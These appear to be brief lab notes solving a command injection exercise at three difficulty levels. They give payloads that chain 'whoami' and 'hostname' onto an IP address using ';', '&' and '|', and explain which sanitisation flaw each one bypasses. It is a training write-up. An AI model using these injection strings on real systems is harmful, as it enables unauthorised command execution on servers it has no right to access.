#Command injection - Remotely, find out the user of the web service on the OS and the machine's hostname via RCE
#Easy difficulty - There is no input sanitisation, thus the current command execution can be escaped out by using ;, &, |, &&, ||
127.0.0.1; whoami; hostname
#Medium difficulty - The input sanitisation done by developer is very limited thus making it possible to escape out by using &.
127.0.0.1 & whoami & hostname
#Hard difficulty - The source code can be analysed to figure out that the input sanitisation done by developer has a typo. Thus, | without space can be used.
127.0.0.1|whoami|hostname
